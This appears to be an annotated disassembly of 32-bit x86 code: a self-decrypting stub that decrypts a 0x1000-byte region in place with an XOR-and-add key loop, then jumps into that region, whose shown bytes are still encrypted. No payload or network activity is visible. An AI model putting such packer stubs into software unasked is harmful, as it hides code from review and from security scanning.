0x005ba000:	cli		; from: 0x00672045(MAY)
0x005ba001:	movb	$0xffffffb8, %bl
0x005ba003:	stosb	%al, %es:(%edi)
0x005ba004:	andb	-60(%ebx), %dl
0x005ba007:	ljmp	0xb322:0xffffffffaba32bbe	; targets: 0x005ba00e(MAY)
0x005ba00e:	movl	$0xbb462f72, %eax	; from: 0x005ba007(MAY)
0x005ba013:	stosb	%al, %es:(%edi)
0x005ba014:	andb	(%ebx), %dh
0x005ba016:	repz ret	; targets: unresolved


start:
0x00672000:	subl	$0x4, %esp
0x00672003:	pushl	%eax
0x00672004:	pushl	%ebx
0x00672005:	call	0x0067200b	; targets: 0x0067200b(MAY)
0x0067200b:	popl	%eax	; from: 0x00672005(MAY)
0x0067200c:	movl	%eax, %ebx
0x0067200e:	incl	%eax
0x0067200f:	subl	$0xb8000, %eax
0x00672014:	subl	$0x1009bd33, %eax
0x00672019:	addl	$0x1009bd28, %eax
0x0067201e:	cmpb	$0xffffffcc, (%ebx)
0x00672021:	jne	0x0067203c	; targets: 0x00672023(MAY)
0x00672023:	movb	$0x0, (%ebx)	; from: 0x00672021(MAY)
0x00672026:	movl	$0x1000, %ebx
0x0067202b:	pushl	$0x3d4624cc
0x00672030:	pushl	$0x68016816
0x00672035:	pushl	%ebx
0x00672036:	pushl	%eax
0x00672037:	call	0x00672046	; targets: 0x00672046(MAY)
0x0067203c:	addl	$0x0, %eax	; from: 0x0067206f(MAY)
0x0067203f:	movl	%eax, 0x8(%esp)
0x00672043:	popl	%ebx
0x00672044:	popl	%eax
0x00672045:	ret	; targets: 0x005ba000(MAY)

0x00672046:	pushl	%ebp	; from: 0x00672037(MAY)
0x00672047:	movl	%esp, %ebp
0x00672049:	pushl	%eax
0x0067204a:	pushl	%ebx
0x0067204b:	pushl	%ecx
0x0067204c:	pushl	%esi
0x0067204d:	movl	0x8(%ebp), %esi
0x00672050:	movl	0xc(%ebp), %ecx
0x00672053:	shrl	$0x2, %ecx
0x00672056:	movl	0x10(%ebp), %eax
0x00672059:	movl	0x14(%ebp), %ebx
0x0067205c:	testl	%ecx, %ecx	; from: 0x00672068(MAY)
0x0067205e:	je	0x0067206a	; targets: 0x0067206a(MAY), 0x00672060(MAY)
0x00672060:	xorl	%eax, (%esi)	; from: 0x0067205e(MAY)
0x00672062:	addl	%ebx, (%esi)
0x00672064:	addl	$0x4, %esi
0x00672067:	decl	%ecx
0x00672068:	jmp	0x0067205c	; targets: 0x0067205c(MAY)
0x0067206a:	popl	%esi	; from: 0x0067205e(MAY)
0x0067206b:	popl	%ecx
0x0067206c:	popl	%ebx
0x0067206d:	popl	%eax
0x0067206e:	leave	
0x0067206f:	ret	$0x10	; targets: 0x0067203c(MAY)

